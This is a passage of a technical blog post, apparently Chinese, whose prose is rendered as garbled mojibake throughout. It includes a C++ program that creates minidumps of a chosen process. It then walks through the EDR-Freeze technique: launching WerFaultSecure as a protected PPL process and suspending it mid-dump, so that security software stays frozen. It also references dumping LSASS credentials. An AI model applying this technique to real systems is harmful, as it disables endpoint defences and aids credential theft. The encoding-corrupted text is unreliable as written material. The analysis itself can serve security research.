ResumeThread(hThread); <span class="comment">// æ¢å¤çº¿ç¨‹</span></span><br><span class="line">                &#125;</span><br><span class="line">                CloseHandle(hThread);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    DWORD targetPid;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter Target Process ID (PID): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; targetPid;</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to open target process! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking thread states before dump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    CheckThreads(targetPid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º minidump</span></span><br><span class="line">    HANDLE hFile = CreateFile(</span><br><span class="line">        <span class="string">L&quot;test.dmp&quot;</span>,</span><br><span class="line">        GENERIC_WRITE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CREATE_ALWAYS,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to create dump file! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating minidump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    BOOL success = MiniDumpWriteDump(</span><br><span class="line">        hProcess,</span><br><span class="line">        targetPid,</span><br><span class="line">        hFile,</span><br><span class="line">        MiniDumpNormal,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;MiniDumpWriteDump failed! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Minidump created successfully!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking thread states after dump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    CheckThreads(targetPid);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘ &amp; è¿è¡Œï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ Dumper.cpp -o Dumper.exe -static-libgcc -static-libstdc++ -l dbghelp</span><br><span class="line">./Dumper.exe</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç›®æ ‡è¿›ç¨‹çš„ PIDï¼ˆ<code>Target.exe</code>çš„ PIDï¼‰ï¼Œè§‚å¯Ÿè¾“å‡ºã€‚</p><hr><h3 id="é¢„æœŸç»“æœ"><a href="#é¢„æœŸç»“æœ" class="headerlink" title="é¢„æœŸç»“æœ"></a><strong>é¢„æœŸç»“æœ</strong></h3><ol><li><strong><code>Target.exe</code>æŒç»­è¾“å‡ºæ—¥å¿—</strong>ï¼š<code>Thread 0 is running... Thread 1 is running... Thread 2 is running... Main thread is running...</code></li><li><strong><code>Dumper.exe</code>è¿è¡Œå</strong>ï¼š<strong>è½¬å‚¨å‰</strong>ï¼š<code>CheckThreads</code>ä¼šæŠ¥å‘Šæ‰€æœ‰çº¿ç¨‹æ˜¯ <strong>RUNNING</strong>ï¼ˆ<code>SuspendThread</code>è¿”å› <code>0</code>ï¼‰ã€‚<strong>è½¬å‚¨æœŸé—´</strong>ï¼š<code>Target.exe</code>çš„æ—¥å¿—è¾“å‡ºä¼š <strong>æš‚åœ</strong>ï¼ˆå› ä¸ºæ‰€æœ‰çº¿ç¨‹è¢« <code>MiniDumpWriteDump</code>æŒ‚èµ·ï¼‰ã€‚<strong>è½¬å‚¨å</strong>ï¼š<code>CheckThreads</code>ä¼šæŠ¥å‘Šæ‰€æœ‰çº¿ç¨‹ <strong>æ¢å¤è¿è¡Œ</strong>ï¼ˆ<code>SuspendThread</code>è¿”å› <code>0</code>ï¼‰ã€‚<code>Target.exe</code>çš„æ—¥å¿—è¾“å‡º <strong>æ¢å¤</strong>ã€‚</li></ol><hr><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a><strong>ç»“è®º</strong></h3><p>âœ… <strong>éªŒè¯æˆåŠŸ</strong>ï¼š</p><ul><li><code>MiniDumpWriteDump</code><strong>ç¡®å®ä¼šæŒ‚èµ·ç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹</strong>ï¼Œä»¥ç¡®ä¿å†…å­˜ä¸€è‡´æ€§ã€‚</li><li>è½¬å‚¨å®Œæˆåï¼Œçº¿ç¨‹ä¼šè‡ªåŠ¨æ¢å¤æ‰§è¡Œã€‚</li></ul><p>âš  <strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p><ul><li>å¦‚æœç›®æ ‡è¿›ç¨‹æŒæœ‰å…³é”®é”ï¼ˆå¦‚å †é”ã€åŠ è½½å™¨é”ï¼‰ï¼Œ<strong>åœ¨ç›®æ ‡è¿›ç¨‹å†…éƒ¨è°ƒç”¨ <code>MiniDumpWriteDump</code>å¯èƒ½å¯¼è‡´æ­»é”</strong>ï¼ˆéªŒè¯äº†å¾®è½¯çš„å»ºè®®ï¼‰ã€‚</li><li><strong>æœ€ä½³å®è·µ</strong>ï¼šå§‹ç»ˆä» <strong>å¤–éƒ¨è¿›ç¨‹</strong> è°ƒç”¨ <code>MiniDumpWriteDump</code>ï¼Œä»¥é¿å…æ­»é”é—®é¢˜ã€‚</li></ul><hr><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a><strong>å®Œæ•´ä»£ç </strong></h3><ul><li><a href="#1-%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8Btargetexe">Target.cpp</a></li><li><a href="#2-%E8%BD%AC%E5%82%A8%E8%BF%9B%E7%A8%8Bdumperexe">Dumper.cpp</a></li></ul><p>ä½ å¯ä»¥ç¼–è¯‘å¹¶è¿è¡Œè¿™ä¸¤ä¸ªç¨‹åºæ¥éªŒè¯ <code>MiniDumpWriteDump</code>çš„è¡Œä¸ºã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922225450029.png" alt="image-20250922225450029"></p><p>ä»£ç æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯å‘ç°è¿è¡Œä¹‹åï¼Œæ²¡æœ‰æš‚åœçš„æ•ˆæœã€‚åŸå› æ˜¯è¿™ä¸ªå‡½æ•°æŒ‚èµ·çš„é€Ÿåº¦å¤ªå¿«äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922225957393.png" alt="image-20250922225957393"></p><p>ä½¿ç”¨å¤§ä½¬å·¥å…·çš„è¯ æŒ‡å®šæ—¶é—´10000æ¯«ç§’ï¼Œæ˜æ˜¾æœ‰ååº”ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922231458306.png" alt="image-20250922231458306"></p><h1 id="åˆ†ææºç -å¦‚ä½•é•¿æ—¶é—´æŒ‚èµ·çº¿ç¨‹"><a href="#åˆ†ææºç -å¦‚ä½•é•¿æ—¶é—´æŒ‚èµ·çº¿ç¨‹" class="headerlink" title="åˆ†ææºç -å¦‚ä½•é•¿æ—¶é—´æŒ‚èµ·çº¿ç¨‹"></a>åˆ†ææºç -å¦‚ä½•é•¿æ—¶é—´æŒ‚èµ·çº¿ç¨‹</h1><h2 id="æ•´ä½“åŸç†ï¼ˆä¸€å¥è¯ï¼‰"><a href="#æ•´ä½“åŸç†ï¼ˆä¸€å¥è¯ï¼‰" class="headerlink" title="æ•´ä½“åŸç†ï¼ˆä¸€å¥è¯ï¼‰"></a>æ•´ä½“åŸç†ï¼ˆä¸€å¥è¯ï¼‰</h2><p>å€ŸåŠ©ç³»ç»Ÿè‡ªå¸¦çš„ WerFaultSecure åœ¨æ‰§è¡Œè½¬å‚¨ï¼ˆdumpï¼‰æ—¶ä¼šâ€œå†»ç»“â€ç›®æ ‡è¿›ç¨‹æ‰€æœ‰çº¿ç¨‹ï¼Œæˆ‘ä»¬åªè¦åœ¨ç›®æ ‡è¢« WER å†»ç»“çš„ç¬é—´æŠŠ WER è‡ªèº«å†æŒ‚èµ·ï¼Œå°±èƒ½è®©ç›®æ ‡ä¿æŒåœ¨æŒ‚èµ·çŠ¶æ€ï¼ˆâ€œå†»ç»“â€ï¼‰ã€‚åˆ°è®¾å®šæ—¶é—´åç»“æŸ WERï¼Œç›®æ ‡è¿›ç¨‹éšä¹‹æ¢å¤ã€‚</p><p><strong>WerFaultSecure</strong>æ”¯æŒåœ¨ <strong>WinTCBçº§åˆ«ä½¿ç”¨****PPL</strong>ä¿æŠ¤è¿è¡Œã€‚</p><p><a href="https://www.zerosalarium.com/2025/09/Dumping-LSASS-With-WER-On-Modern-Windows-11.html">å‚è€ƒ</a>é€†å‘å·¥ç¨‹çš„ è¿è¡Œ<strong>WerFaultSecure</strong> çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥æ¿€æ´»ä»»ä½•æ‰€éœ€è¿›ç¨‹çš„ <strong>MiniDumpWriteDumpå‡½æ•°ã€‚</strong></p><p>å¯¹åº”ä»£ç ï¼š</p><ul><li>å…¥å£ï¼š<code>wmain</code>ï¼ˆ<code>EDR-Freeze.cpp</code>ï¼‰</li><li>ä¸»æµç¨‹ï¼š<code>FreezeRun</code>ï¼ˆ<code>EDR-Freeze.cpp</code>ï¼‰</li><li>ç›‘æ§çº¿ç¨‹ï¼š<code>PauseCheck</code>ï¼ˆ<code>EDR-Freeze.cpp</code>ï¼‰</li><li>å·¥å…·å‡½æ•°ï¼š<code>ProcessMisc.h/.cpp</code>ï¼ˆæƒé™ã€çº¿ç¨‹æšä¸¾ã€æŒ‚èµ·&#x2F;ç»ˆæ­¢ç­‰ï¼‰</li><li>å¯åŠ¨ WERï¼ˆPPL è¿›ç¨‹ï¼‰ï¼š<code>PPLHelp.h/.cpp</code></li></ul><hr><h2 id="ä¸ºä»€ä¹ˆè¦æŠŠ-WerFaultSecure-ä½œä¸ºå­è¿›ç¨‹å¯åŠ¨ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æŠŠ-WerFaultSecure-ä½œä¸ºå­è¿›ç¨‹å¯åŠ¨ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æŠŠ WerFaultSecure ä½œä¸ºå­è¿›ç¨‹å¯åŠ¨ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æŠŠ WerFaultSecure ä½œä¸ºå­è¿›ç¨‹å¯åŠ¨ï¼Ÿ</h2><p>ä»£ç é€šè¿‡ <code>CreateProcessW</code> å¯åŠ¨ <code>C:\Windows\System32\WerFaultSecure.exe</code>ï¼Œè‡ªç„¶æˆä¸ºå½“å‰å·¥å…·è¿›ç¨‹çš„â€œå­è¿›ç¨‹â€ã€‚è¿™æ ·åšæœ‰ä¸‰ä¸ªå…³é”®åŸå› ï¼š</p><ol><li>åˆ©ç”¨ç³»ç»Ÿè¡Œä¸ºï¼šä¸ç›´æ¥æ³¨å…¥æˆ–ç¯¡æ”¹ç›®æ ‡è¿›ç¨‹ï¼Œè€Œæ˜¯â€œå€ŸåŠ›â€ç³»ç»Ÿç»„ä»¶ WER çš„å†»ç»“&#x2F;è½¬å‚¨èƒ½åŠ›ã€‚</li><li>ç»§æ‰¿å¥æŸ„ï¼šæˆ‘ä»¬ç»™ WER ä¼ é€’äº†å¯ç»§æ‰¿çš„æ–‡ä»¶å’Œäº‹ä»¶å¥æŸ„ï¼ˆå‘½ä»¤è¡Œé‡Œ <code>/encfile &lt;å¥æŸ„&gt;</code>ã€<code>/cancel &lt;å¥æŸ„&gt;</code>ï¼‰ï¼Œè¦è®©å­è¿›ç¨‹ç»§æ‰¿å¹¶ä½¿ç”¨è¿™äº›å¥æŸ„ã€‚</li><li>æå‡ä¿æŠ¤ï¼šé€šè¿‡ <code>PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL + CREATE_PROTECTED_PROCESS</code> æŠŠ WER ä»¥ PPL çº§åˆ«æ‹‰èµ·ï¼ˆè§ <code>PPLProcessCreator::CreatePPLProcess</code>ï¼‰ï¼Œå‡å°‘è¢«å®‰å…¨äº§å“æ‹¦æˆªçš„æ¦‚ç‡ã€‚</li></ol><p>ä»£ç ä½ç½®é€Ÿè§ˆï¼š</p><ul><li>æ„é€ å‘½ä»¤è¡Œä¸å¯ç»§æ‰¿å¥æŸ„ï¼š<code>FreezeRun</code>ï¼ˆ<code>EDR-Freeze.cpp</code>ï¼‰</li><li>åˆ›å»º PPL å­è¿›ç¨‹ï¼š<code>PPLProcessCreator::CreatePPLProcess</code>ï¼ˆ<code>PPLHelp.cpp</code>ï¼‰</li></ul><hr><h2 id="åªæŒ‡å®šä¸»çº¿ç¨‹-TIDï¼Œä¸ºä½•â€œæ‰€æœ‰çº¿ç¨‹â€éƒ½ä¼šæŒ‚èµ·ï¼Ÿ"><a href="#åªæŒ‡å®šä¸»çº¿ç¨‹-TIDï¼Œä¸ºä½•â€œæ‰€æœ‰çº¿ç¨‹â€éƒ½ä¼šæŒ‚èµ·ï¼Ÿ" class="headerlink" title="åªæŒ‡å®šä¸»çº¿ç¨‹ TIDï¼Œä¸ºä½•â€œæ‰€æœ‰çº¿ç¨‹â€éƒ½ä¼šæŒ‚èµ·ï¼Ÿ"></a>åªæŒ‡å®šä¸»çº¿ç¨‹ TIDï¼Œä¸ºä½•â€œæ‰€æœ‰çº¿ç¨‹â€éƒ½ä¼šæŒ‚èµ·ï¼Ÿ</h2><p>ä¼ ç»™ WerFaultSecure çš„ <code>/pid &lt;ç›®æ ‡PID&gt;</code> å’Œ <code>/tid &lt;ä¸»çº¿ç¨‹TID&gt;</code>ï¼Œå…¶ä¸­ TID æ›´å¤šæ˜¯â€œä¸Šä¸‹æ–‡&#x2F;é¦–é€‰çº¿ç¨‹â€çš„æç¤ºç‚¹ï¼Œä¾‹å¦‚ç”¨äºæ ˆå›æº¯æˆ–å¼‚å¸¸ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸æ„å‘³ç€â€œä»…æŒ‚èµ·è¿™ä¸€æ¡çº¿ç¨‹â€ã€‚</p><p>ä¸ºäº†ç”Ÿæˆä¸€è‡´æ€§çš„å†…å­˜è½¬å‚¨ï¼ˆå°¤å…¶åƒ full dumpï¼‰ï¼ŒWER&#x2F;è½¬å‚¨æœºåˆ¶ä¼šåœ¨å†…éƒ¨å†»ç»“æ•´ä¸ªç›®æ ‡è¿›ç¨‹ï¼ˆæ‰€æœ‰çº¿ç¨‹ï¼‰ã€‚è¿™å¯ä»¥ç­‰ä»·ç†è§£ä¸ºï¼šWER ä¼šå¯¹ç›®æ ‡è¿›ç¨‹æ‰§è¡Œæ•´è¿›ç¨‹æŒ‚èµ·ç­–ç•¥ï¼ˆæ•ˆæœç±»ä¼¼é€çº¿ç¨‹ Suspend æˆ–ç³»ç»Ÿè°ƒç”¨å±‚é¢çš„æ•´è¿›ç¨‹æŒ‚èµ·ï¼‰ï¼Œç›´åˆ°è½¬å‚¨å®Œæˆåå†æ¢å¤ã€‚</p><p>æˆ‘ä»¬ä»£ç å¹¶æœªç›´æ¥æŒ‚èµ·ç›®æ ‡è¿›ç¨‹ï¼Œè€Œæ˜¯ï¼š</p><ol><li>ä½¿ç”¨ <code>GetMainThreadId(pid)</code> å¾—åˆ°ä¸»çº¿ç¨‹ IDï¼ˆä»…ä½œä¸º WER çš„å‚è€ƒä¸Šä¸‹æ–‡ï¼‰ã€‚</li><li>ç”¨ <code>IsProcessSuspendedByPID(pid)</code> è½®è¯¢ï¼Œåˆ¤æ–­ç›®æ ‡æ˜¯å¦è¿›å…¥â€œæ‰€æœ‰çº¿ç¨‹éƒ½æ˜¯ Wait+Suspendedâ€çš„çŠ¶æ€â€”â€”è¿™æ°æ˜¯ WER å†»ç»“ä¸­çš„ç‰¹å¾ã€‚</li><li>ä¸€æ—¦åˆ¤æ–­æˆç«‹ï¼Œå°± <code>SuspendProcessByPID(werPid)</code> æŠŠ WER è‡ªèº«æŒ‚èµ·ï¼Œä»è€Œè®©ç›®æ ‡ä¿æŒå†»ç»“ã€‚</li><li>è®¡æ—¶ç»“æŸå <code>TerminateProcessByPID(werPid)</code> ç»ˆæ­¢ WERï¼Œç›®æ ‡éšä¹‹è§£å†»ã€‚</li></ol><p>ç›¸å…³å®ç°ï¼š<code>ProcessMisc.cpp</code> ä¸­çš„ <code>GetMainThreadId</code>ã€<code>IsProcessSuspendedByPID</code>ã€<code>SuspendProcessByPID</code>ã€<code>TerminateProcessByPID</code>ã€‚</p><hr><h2 id="ä¸ºä»€ä¹ˆâ€œæ‰§è¡Œ-WERâ€ä¸â€œæ£€æµ‹å†»ç»“å¹¶æŒ‚èµ·-WER-è‡ªèº«â€çœ‹èµ·æ¥åŒæ—¶è¿›è¡Œï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆâ€œæ‰§è¡Œ-WERâ€ä¸â€œæ£€æµ‹å†»ç»“å¹¶æŒ‚èµ·-WER-è‡ªèº«â€çœ‹èµ·æ¥åŒæ—¶è¿›è¡Œï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆâ€œæ‰§è¡Œ WERâ€ä¸â€œæ£€æµ‹å†»ç»“å¹¶æŒ‚èµ· WER è‡ªèº«â€çœ‹èµ·æ¥åŒæ—¶è¿›è¡Œï¼Ÿ"></a>ä¸ºä»€ä¹ˆâ€œæ‰§è¡Œ WERâ€ä¸â€œæ£€æµ‹å†»ç»“å¹¶æŒ‚èµ· WER è‡ªèº«â€çœ‹èµ·æ¥åŒæ—¶è¿›è¡Œï¼Ÿ</h2><p>å› ä¸ºå­˜åœ¨ä¸¤ä¸ªå¹¶å‘æ‰§è¡Œä½“ï¼š</p><ul><li>ç‹¬ç«‹çš„ WER è¿›ç¨‹ï¼š<code>CreateProcessW</code> å¯åŠ¨åï¼ŒWER ç”±å†…æ ¸è°ƒåº¦ç‹¬ç«‹è¿è¡Œï¼Œå¼€å§‹å¯¹ç›®æ ‡åšè½¬å‚¨å¹¶å†»ç»“å…¶çº¿ç¨‹ï¼›</li><li>å½“å‰è¿›ç¨‹å†…çš„ç›‘æ§çº¿ç¨‹ï¼š<code>CreateThread</code> å¯åŠ¨ <code>PauseCheck</code>ï¼Œè½®è¯¢åˆ¤æ–­ç›®æ ‡æ˜¯å¦â€œå…¨çº¿ç¨‹æŒ‚èµ·â€ï¼Œä¸€æ—¦æˆç«‹å°±æŒ‚èµ· WERã€‚</li></ul><p>è¿™äºŒè€…å¹¶è¡Œæ‰§è¡Œï¼Œå› æ­¤ç°è±¡ä¸Šæ˜¯â€œåŒæ—¶è¿›è¡Œâ€ã€‚ä¸æ­¤åŒæ—¶ï¼Œä¸»çº¿ç¨‹åœ¨ <code>Sleep(sleepTime)</code>ï¼Œè®¡æ—¶ç»“æŸå†ç»“æŸ WERã€‚</p><p>å¹¶å‘åŸè¯­ä¸æµç¨‹ï¼š</p><ol><li><code>CreateProcessW</code> â†’ å¯åŠ¨ WERï¼ˆå­è¿›ç¨‹ï¼‰ã€‚</li><li><code>CreateThread(PauseCheck)</code> â†’ å¯åŠ¨ç›‘æ§çº¿ç¨‹ï¼Œè½®è¯¢ <code>IsProcessSuspendedByPID</code>ã€‚</li><li>ç›‘æ§çº¿ç¨‹æ£€æµ‹åˆ°ç›®æ ‡å·²å†»ç»“ â†’ è°ƒç”¨ <code>SuspendProcessByPID(werPid)</code> æŒ‚èµ· WERã€‚</li><li>ä¸»çº¿ç¨‹ <code>Sleep</code> åˆ°æœŸ â†’ <code>TerminateProcessByPID(werPid)</code>ï¼Œç›®æ ‡æ¢å¤ã€‚</li></ol><p>å¯æ”¹è¿›ç‚¹ï¼šå½“å‰è½®è¯¢ä¸ºå¿™ç­‰ï¼Œå¯åœ¨ <code>PauseCheck</code> ä¸­åŠ å…¥å°ç¡çœ ï¼ˆå¦‚ <code>Sleep(1~10ms)</code>ï¼‰æˆ–äº‹ä»¶åŒæ­¥ï¼Œé™ä½ CPU å ç”¨å¹¶æ›´ä¼˜é›…åœ°æ”¶å°¾ã€‚</p><hr><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922231458306.png" alt="image-20250922231458306"></p><h1 id="åˆ†ææºç -æŒ‚èµ·PPLè¿›ç¨‹çš„æƒé™é—®é¢˜"><a href="#åˆ†ææºç -æŒ‚èµ·PPLè¿›ç¨‹çš„æƒé™é—®é¢˜" class="headerlink" title="åˆ†ææºç -æŒ‚èµ·PPLè¿›ç¨‹çš„æƒé™é—®é¢˜"></a>åˆ†ææºç -æŒ‚èµ·PPLè¿›ç¨‹çš„æƒé™é—®é¢˜</h1><h2 id="ä»€ä¹ˆæ˜¯-PPLï¼ˆProtected-Process-Lightï¼‰"><a href="#ä»€ä¹ˆæ˜¯-PPLï¼ˆProtected-Process-Lightï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯ PPLï¼ˆProtected Process Lightï¼‰"></a>ä»€ä¹ˆæ˜¯ PPLï¼ˆProtected Process Lightï¼‰</h2><p>PPL æ˜¯ Windows çš„â€œå—ä¿æŠ¤è¿›ç¨‹ï¼ˆè½»é‡ç‰ˆï¼‰â€æœºåˆ¶ã€‚ä¸æ™®é€šè¿›ç¨‹ç›¸æ¯”ï¼ŒPPL åœ¨â€œå¥æŸ„æˆäºˆ&#x2F;è®¿é—®æ§åˆ¶â€ä¸Šç”±å†…æ ¸å®æ–½æ›´ä¸¥æ ¼çš„ç­–ç•¥ï¼š</p><ul><li>å³ä½¿æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ä¸ SeDebugPrivilegeï¼Œä½ä¿æŠ¤çº§åˆ«çš„è¿›ç¨‹ä¹Ÿæ— æ³•å¯¹é«˜ä¿æŠ¤çº§åˆ«çš„ PPL è¿›ç¨‹è·å–æ•æ„Ÿè®¿é—®ï¼ˆå¦‚è¯»&#x2F;å†™å†…å­˜ã€æŒ‚èµ·&#x2F;ç»ˆæ­¢ç­‰ï¼‰ã€‚</li><li>åªæœ‰â€œåŒçº§æˆ–æ›´é«˜ä¿æŠ¤â€çš„è°ƒç”¨æ–¹ï¼ˆæˆ–å†…æ ¸&#x2F;é©±åŠ¨ï¼‰æ‰èƒ½è¢«æˆäºˆè¶³å¤Ÿæƒé™çš„å¥æŸ„ã€‚</li></ul><p>PPL æœºåˆ¶çš„ç›®æ ‡æ˜¯ä¿æŠ¤ç³»ç»Ÿå®‰å…¨ç»„ä»¶ï¼ˆå¦‚ LSAã€åæ¶æ„è½¯ä»¶ã€ç³»ç»Ÿå…³é”®æœåŠ¡ï¼‰å…å—åŒæœºé«˜æƒé™ä½†ä½å¯ä¿¡ç»„ä»¶çš„å¹²æ‰°ã€‚</p><hr><h2 id="ä¿æŠ¤ç­‰çº§çš„ä¸¤ä¸ªç»´åº¦ï¼šSigner-ç±»åˆ«-å¼ºåº¦ï¼ˆLight-Fullï¼‰"><a href="#ä¿æŠ¤ç­‰çº§çš„ä¸¤ä¸ªç»´åº¦ï¼šSigner-ç±»åˆ«-å¼ºåº¦ï¼ˆLight-Fullï¼‰" class="headerlink" title="ä¿æŠ¤ç­‰çº§çš„ä¸¤ä¸ªç»´åº¦ï¼šSigner ç±»åˆ« + å¼ºåº¦ï¼ˆLight&#x2F;Fullï¼‰"></a>ä¿æŠ¤ç­‰çº§çš„ä¸¤ä¸ªç»´åº¦ï¼šSigner ç±»åˆ« + å¼ºåº¦ï¼ˆLight&#x2F;Fullï¼‰</h2><p>ä¿æŠ¤ç­‰çº§ä¸ä»…æ˜¯â€œé«˜&#x2F;ä½â€ï¼Œå®ƒåŒ…å«ä¸¤ä¸ªç»´åº¦ï¼š</p><ul><li>Signer ç±»åˆ«ï¼ˆç­¾åè€…&#x2F;ä¿¡ä»»åŸŸï¼‰ï¼šå¦‚ Windowsã€WinTCBã€LSAã€Antimalware ç­‰ï¼›</li><li>å¼ºåº¦ï¼šLight è¡¨ç¤º PPLï¼ˆProtected Process Lightï¼‰ï¼ŒFull è¡¨ç¤º PPï¼ˆå—ä¿æŠ¤è¿›ç¨‹ï¼Œå¼ºåº¦æ›´é«˜ï¼‰ã€‚</li></ul><p>å¸¸è§ï¼ˆç¤ºæ„ï¼‰ç­‰çº§åï¼š</p><ul><li>PROTECTION_LEVEL_WINDOWS_LIGHT &#x2F; PROTECTION_LEVEL_WINDOWS</li><li>PROTECTION_LEVEL_LSA_LIGHT</li><li>PROTECTION_LEVEL_ANTIMALWARE_LIGHT</li><li>PROTECTION_LEVEL_WINTCB_LIGHT &#x2F;ï¼ˆWinTCB Full å±äºæ›´é«˜å¼ºåº¦çš„å—ä¿æŠ¤è¿›ç¨‹ï¼‰</li></ul><p>è¯´æ˜ï¼šä¸åŒç³»ç»Ÿç‰ˆæœ¬ä¸è¡¥ä¸ä¸­ï¼Œå¯ç”¨ç­‰çº§ä»¥åŠæ¯”è¾ƒè§„åˆ™ä¼šæœ‰å·®å¼‚ï¼›æ€»ä½“åŸåˆ™æ˜¯â€œSigner ç±»åˆ« + å¼ºåº¦â€å…±åŒå†³å®šç›¸å¯¹é«˜ä½ä¸å¯è®¿é—®æ€§ã€‚</p><hr><h2 id="â€œFull-WinTCB-ä¿æŠ¤â€æ˜¯ä»€ä¹ˆæ„æ€"><a href="#â€œFull-WinTCB-ä¿æŠ¤â€æ˜¯ä»€ä¹ˆæ„æ€" class="headerlink" title="â€œFull WinTCB ä¿æŠ¤â€æ˜¯ä»€ä¹ˆæ„æ€"></a>â€œFull WinTCB ä¿æŠ¤â€æ˜¯ä»€ä¹ˆæ„æ€</h2><p>å½“æŸè¿›ç¨‹æ˜¾ç¤ºä¸ºâ€œWinTCB Fullâ€æ—¶ï¼Œè¡¨ç¤ºå®ƒå¤„äºéå¸¸é«˜çš„ä¿æŠ¤çº§åˆ«ï¼š</p><ul><li>Signer ç±»åˆ«ä¸º WinTCBï¼ˆWindows TCBï¼šå¯ä¿¡è®¡ç®—åŸºåº•ï¼Œç³»ç»Ÿæ ¸å¿ƒä¿¡ä»»åŸŸä¹‹ä¸€ï¼‰ã€‚</li><li>å¼ºåº¦ä¸º Fullï¼ˆå—ä¿æŠ¤è¿›ç¨‹ï¼Œé Lightï¼‰ï¼Œæ¯” PPL è¿˜ä¸¥æ ¼ã€‚</li></ul><p>å«ä¹‰ï¼š</p><ul><li>åªæœ‰â€œåŒç±»åˆ«ä¸”å¼ºåº¦ä¸ä½â€çš„è¿›ç¨‹ï¼Œæˆ–å†…æ ¸ï¼Œæ‰å¯èƒ½è·å¾—å¯¹å…¶çš„æ•æ„Ÿè®¿é—®ã€‚</li><li>æ™®é€šè¿›ç¨‹ï¼ˆå³ä½¿ç®¡ç†å‘˜ + SeDebugPrivilegeï¼‰é€šå¸¸æ‹¿ä¸åˆ°å¦‚ <code>PROCESS_SUSPEND_RESUME</code> æ­¤ç±»æ•æ„Ÿæƒé™çš„è¿›ç¨‹å¥æŸ„ï¼Œè‡ªç„¶æ— æ³•æŒ‚èµ·å…¶çº¿ç¨‹ã€è¯»å–æ•æ„Ÿå†…å­˜æˆ–å°†å…¶ç»ˆæ­¢ã€‚</li></ul><hr><h2 